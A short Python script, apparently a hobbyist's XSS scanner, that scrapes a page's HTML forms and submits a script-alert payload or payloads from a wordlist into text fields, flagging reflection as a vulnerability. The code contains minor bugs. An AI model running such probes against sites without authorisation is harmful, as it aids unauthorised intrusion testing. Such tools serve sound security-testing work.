"""


THIS SHIT WAS MADE BY RENNAARENATA :)


"""


import requests
from bs4 import BeautifulSoup as bsp 
from urllib.parse import urljoin
from pprint import pprint

def wlhandler(url, filename):
        with open(wordlist, 'r') as wd:
            for line in wd:
                scanx(domain, line)
                print(f"[+] Trying {line}")



def getforms(url):
    zuppapazzasgravata =bsp(requests.get(url).content, "html.parser")
    return zuppapazzasgravata.find_all("form") 

def details(forms):
    detailsf = {}
    
    action = forms.attrs.get("action") 
    method = forms.attrs.get("method", "get").lower()    
    inputs = []

    for input_tag in forms.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    detailsf["action"] = action
    detailsf["method"] = method
    detailsf["inputs"] = inputs

    return detailsf
   
def submitf(form_details, url, val):
    
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if(input["type"] == "text" or input["type"] == "search"):
            input["value"] = val
        input_name = input.get("name")
        input_value = input.get("value")
        if(input_name and input_value):
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


def scanx(url, jscrpt):
    
    if(jscrpt == None):
        jscrpt = "<script>alert(1)</script>"
    isv = False

    for form in forms:
        form_details = details(form)
        content = submitf(form_details, url, jscrpt).content.decode()
        if(jscrpt in content):
            print(f"[+] XSS Detected on {url}")
            print(f"[i] Form details:")
            pprint(form_details)
            isv = True
            exit(1)
    return isv

def handler(domain, custom, wordlist):
    scanx(domain, custom)
    if(wordlist != None):
        wlhandler(domain, wordlist)

if __name__ == "__main__":
    
    

    import argparse
    parser = argparse.ArgumentParser(description="XSS vulnerability scanner by Rennaarenata")
    parser.add_argument("domain", help="Domain to scan for xss vulnerability with protocol (e.g http://www.site.com/page.php or http://site.com)")
    parser.add_argument("-c", "--custom", help="If you want to select a custom payload, this command's for you", 
                        default="<script>alert(1)</script>")
    parser.add_argument("-wl", "--wordlist", help="If you want to use a wordlist of custom payloads, select your file with this command!")


    args = parser.parse_args()
    domain = args.domain
    wordlist = args.wordlist
    custom = args.custom

    print("[+] Searching for forms...")
    forms = getforms(domain)
    print(f"[+] Detected {len(forms)} forms on {domain}")
    
    handler(domain=domain, custom=custom, wordlist=wordlist)
    
    if(scanx(domain, custom) == False):
        print("[+] The target seems to be not vulnerable")
        exit
